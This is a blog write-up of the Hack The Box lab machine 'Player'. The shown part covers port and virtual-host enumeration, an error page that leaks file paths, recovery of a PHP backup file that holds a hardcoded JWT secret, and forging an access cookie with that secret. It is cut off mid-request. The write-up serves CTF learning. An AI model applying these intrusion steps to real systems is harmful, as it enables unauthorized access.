<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Player - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Player from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Player">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/player/">


  <meta property="og:description" content="My write-up / walkthrough for Player from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Player">
  <meta name="twitter:description" content="My write-up / walkthrough for Player from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/player/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2020-01-18T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/player/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Player">
    <meta itemprop="description" content="Hack The Box - Player">
    <meta itemprop="datePublished" content="2020-01-18T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/player/" class="u-url" itemprop="url">Hack The Box - Player
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2020-01-18T07:00:00+02:00">January 18, 2020</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          10 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---player">Hack The Box - Player</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#ffmpeg-hls-vulnerability--arbitrary-file-read">FFmpeg HLS Vulnerability –&gt; Arbitrary File Read</a></li>
<li><a href="#openssh-72p1-xauth-command-injection--user-flag">OpenSSH 7.2p1 xauth Command Injection –&gt; User Flag</a></li>
<li><a href="#credentials-in-fixphp--rce--shell-as-www-data">Credentials in fix.php –&gt; RCE –&gt; Shell as www-data</a></li>
<li><a href="#root-flag">Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---player">Hack The Box - Player</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Player retired and here’s my write-up about it. It was a relatively hard CTF-style machine with a lot of enumeration and a couple of interesting exploits. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.145</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">player.htb</code>. Let’s jump right in !</p>

<p><br><img src="/images/hackthebox/player/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nmap -sV -sT -sC -o nmapinitial player.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 16:29 EST
Nmap scan report for player.htb (10.10.10.145)
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">http</code> on port 80 and <code class="language-plaintext highlighter-rouge">ssh</code> on port 22.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>I got a 403 response when I went to <code class="language-plaintext highlighter-rouge">http://player.htb/</code>:
<br><img src="/images/hackthebox/player/1.png" alt="" class="align-center"><br><br>
I used <code class="language-plaintext highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">subdomains-top1mil-5000.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">seclists</code></a> to enumerate virtual hosts and got these results:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.player.htb" http://10.10.10.145

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************
Target: http://10.10.10.145/
Total requests: 4997
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================
000000019:   200        86 L     229 W    5243 Ch     "dev"
000000067:   200        63 L     180 W    1470 Ch     "staging"
000000070:   200        259 L    714 W    9513 Ch     "chat"

Total time: 129.1540
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 38.69021

root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p>I added them to my hosts file and started checking each one of them.<br>
On <code class="language-plaintext highlighter-rouge">dev</code> there was an application that needed credentials so we’ll skip that one until we find some credentials:
<br><img src="/images/hackthebox/player/2.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">staging</code> was kinda empty but there was an interesting contact form:
<br><img src="/images/hackthebox/player/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/5.png" alt="" class="align-center"><br><br>
The form was interesting because when I attempted to submit it I got a weird error for a second then I got redirected to <code class="language-plaintext highlighter-rouge">/501.php</code>:
<br><img src="/images/hackthebox/player/6.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/7.png" alt="" class="align-center"><br><br>
I intercepted the request with burp to read the error.<br>
Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/contact.php?firstname=test&amp;subject=test</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">staging.player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://staging.player.htb/contact.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="nc">Date</span><span class="o">:</span> <span class="nc">Fri</span><span class="p">,</span> <span class="mi">17</span> <span class="nc">Jan</span> <span class="mi">2020</span> <span class="mi">19</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mi">33</span> <span class="no">GMT</span>
<span class="nc">Server</span><span class="o">:</span> <span class="nc">Apache</span><span class="o">/</span><span class="mf">2.4.7</span> <span class="p">(</span><span class="nc">Ubuntu</span><span class="p">)</span>
<span class="nc">X</span><span class="o">-</span><span class="nc">Powered</span><span class="o">-</span><span class="nc">By</span><span class="o">:</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.5.9</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu4</span><span class="mf">.26</span>
<span class="n">refresh</span><span class="o">:</span> <span class="mi">0</span><span class="p">;</span><span class="n">url</span><span class="o">=</span><span class="mf">501.</span><span class="n">php</span>
<span class="nc">Vary</span><span class="o">:</span> <span class="nc">Accept</span><span class="o">-</span><span class="nc">Encoding</span>
<span class="nc">Content</span><span class="o">-</span><span class="nc">Length</span><span class="o">:</span> <span class="mi">818</span>
<span class="nc">Connection</span><span class="o">:</span> <span class="n">close</span>
<span class="nc">Content</span><span class="o">-</span><span class="nc">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>

<span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">int</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"c"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">"Cleveland"</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">int</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"b"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Glenn"</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"a"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Peter"</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nc">Database</span> <span class="n">connection</span> <span class="n">failed</span><span class="mf">.</span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">br</span> <span class="o">/&gt;</span><span class="nc">Unknown</span> <span class="n">variable</span> <span class="n">user</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backup</span><span class="o">/</span><span class="n">service_config</span> <span class="n">fatal</span> <span class="n">error</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">staging</span><span class="o">/</span><span class="n">fix</span><span class="mf">.</span><span class="n">php</span>
</code></pre></div></div>
<p>The error exposed some filenames like <code class="language-plaintext highlighter-rouge">/var/www/backup/service_config</code>, <code class="language-plaintext highlighter-rouge">/var/www/staging/fix.php</code> and <code class="language-plaintext highlighter-rouge">/var/www/staging/contact.php</code>. That will be helpful later.<br>
<code class="language-plaintext highlighter-rouge">chat</code> was a static page that simulated a chat application:
<br><img src="/images/hackthebox/player/8.png" alt="" class="align-center"><br><br>
I took a quick look at the chat history between Olla and Vincent, Olla asked him about some pentest reports and he replied with 2 interesting things :
<br><img src="/images/hackthebox/player/9.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/10.png" alt="" class="align-center"><br><br></p>

<ol>
  <li>Staging exposing sensitive files.<br>
</li>
  <li>Main domain exposing source code allowing to access the product before release.<br>
</li>
</ol>

<p>We already saw that <code class="language-plaintext highlighter-rouge">staging</code> was exposing files, I ran <code class="language-plaintext highlighter-rouge">gobuster</code> on the main domain and found <code class="language-plaintext highlighter-rouge">/launcher</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://player.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/17 19:17:29 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/launcher (Status: 301)
/server-status (Status: 403)
===============================================================
2020/01/17 19:18:59 Finished
===============================================================
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">http://player.htb/launcher</code>:
<br><img src="/images/hackthebox/player/11.png" alt="" class="align-center"><br><br>
I tried to submit that form but it did nothing, I just got redirected to <code class="language-plaintext highlighter-rouge">/launcher</code> again:
Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://player.htb/launcher/index.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 22:45:04 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">index.html</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
</code></pre></div></div>
<p>We know from the chat that the source code is exposed somewhere, I wanted to read the source of <code class="language-plaintext highlighter-rouge">/launcher/dee8dc8a47256c64630d803a4c40786c.php</code> so I tried some basic stuff like adding <code class="language-plaintext highlighter-rouge">.swp</code>, <code class="language-plaintext highlighter-rouge">.bak</code> and <code class="language-plaintext highlighter-rouge">~</code> after the file name. <code class="language-plaintext highlighter-rouge">~</code> worked (check <a href="https://superuser.com/questions/546146/what-does-a-mean-after-a-file-name-in-unix-bash" target="_blank" rel="noopener noreferrer">this</a> out):</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>

<span class="kn">use</span> <span class="err">\</span><span class="no">Firebase\JWT\JWT</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">]))</span>
<span class="p">{</span>
        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
        <span class="nv">$decoded</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">::</span><span class="nf">decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">],</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="p">[</span><span class="s1">'HS256'</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$decoded</span><span class="o">-&gt;</span><span class="n">access_code</span> <span class="o">===</span> <span class="s2">"0E76658526655756207688271159624026011393"</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: 7F2xxxxxxxxxxxxx/"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
        <span class="nv">$token_payload</span> <span class="o">=</span> <span class="p">[</span>
          <span class="s1">'project'</span> <span class="o">=&gt;</span> <span class="s1">'PlayBuff'</span><span class="p">,</span>
          <span class="s1">'access_code'</span> <span class="o">=&gt;</span> <span class="s1">'C0B137FE2D792459F26FF763CCE44574A5B5AB03'</span>
        <span class="p">];</span>
        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
        <span class="nv">$jwt</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">::</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$token_payload</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="s1">'HS256'</span><span class="p">);</span>
        <span class="nv">$cookiename</span> <span class="o">=</span> <span class="s1">'access'</span><span class="p">;</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'access'</span><span class="p">,</span><span class="nv">$jwt</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">"/"</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
root@kali:~/Desktop/HTB/boxes/player#
</code></pre></div></div>
<p>It decodes the <code class="language-plaintext highlighter-rouge">JWT</code> token from the cookie <code class="language-plaintext highlighter-rouge">access</code> and redirects us to a redacted path if the value of <code class="language-plaintext highlighter-rouge">access_code</code> was <code class="language-plaintext highlighter-rouge">0E76658526655756207688271159624026011393</code>, otherwise it will assign an <code class="language-plaintext highlighter-rouge">access</code> cookie for us with <code class="language-plaintext highlighter-rouge">C0B137FE2D792459F26FF763CCE44574A5B5AB03</code> as the value of <code class="language-plaintext highlighter-rouge">access_code</code> and redirect us to <code class="language-plaintext highlighter-rouge">index.html</code>.<br>
We have the secret <code class="language-plaintext highlighter-rouge">_S0_R@nd0m_P@ss_</code> so we can easily craft a valid cookie. I used <a href="https://jwt.io/" target="_blank" rel="noopener noreferrer">jwt.io</a> to edit my token.<br>
<br><img src="/images/hackthebox/player/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/player/13.png" alt="" class="align-center"><br><br>
I used the cookie and got redirected to <code class="language-plaintext highlighter-rouge">/7F2dcsSdZo6nj3SNMTQ1</code>:
Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://player.htb/launcher/index.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
